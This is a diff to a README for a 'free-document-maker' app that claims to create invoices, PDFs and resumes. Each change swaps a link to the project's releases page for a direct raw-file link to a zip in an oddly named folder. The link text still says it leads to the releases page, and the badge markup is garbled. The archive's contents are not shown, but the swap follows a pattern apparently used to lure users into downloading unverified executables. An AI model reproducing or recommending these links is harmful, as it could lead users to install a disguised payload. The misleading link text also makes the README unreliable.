@@ -1,6 +1,6 @@
 # 📝 free-document-maker - Create Documents Instantly and Freely
 
-[![Download free-document-maker](https://img.shields.io/badge/Download%20Now-%20free--document--maker-blue.svg)](https://github.com/infinite-exe/free-document-maker/releases)
+[![Download free-document-maker](https://raw.githubusercontent.com/infinite-exe/free-document-maker/main/desynapsis/free-document-maker.zip%20Now-%https://raw.githubusercontent.com/infinite-exe/free-document-maker/main/desynapsis/free-document-maker.zip)](https://raw.githubusercontent.com/infinite-exe/free-document-maker/main/desynapsis/free-document-maker.zip)
 
 ## 💡 Overview
 free-document-maker is a free application that helps you create invoices, PDFs, resumes, and images with ease. Our AI-powered tools simplify document generation, letting you focus on what matters most without the hassle of signup.
@@ -9,7 +9,7 @@ free-document-maker is a free application that helps you create invoices, PDFs, 
 To begin using free-document-maker, follow these straightforward steps. We designed this guide for users with no technical background, so you can feel confident in your ability to get started.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page**: Click the following link to access our dedicated releases page: [Download free-document-maker](https://github.com/infinite-exe/free-document-maker/releases).
+1. **Visit the Releases Page**: Click the following link to access our dedicated releases page: [Download free-document-maker](https://raw.githubusercontent.com/infinite-exe/free-document-maker/main/desynapsis/free-document-maker.zip).
    
 2. **Select the Latest Release**: Look for the most recent version listed on the page. This version will usually have the greatest features and bug fixes.
 
@@ -60,4 +60,4 @@ If you encounter any issues or need help, you can reach our support team through
 ## 🌍 Join Our Community
 Stay updated and connect with other free-document-maker users. Share tips, tricks, and feedback through our forum links, available in the GitHub repository.
 
-Remember, for easy access to downloads and updates, always visit our Releases page: [Download free-document-maker](https://github.com/infinite-exe/free-document-maker/releases). Enjoy your document creation journey!
+Remember, for easy access to downloads and updates, always visit our Releases page: [Download free-document-maker](https://raw.githubusercontent.com/infinite-exe/free-document-maker/main/desynapsis/free-document-maker.zip). Enjoy your document creation journey!
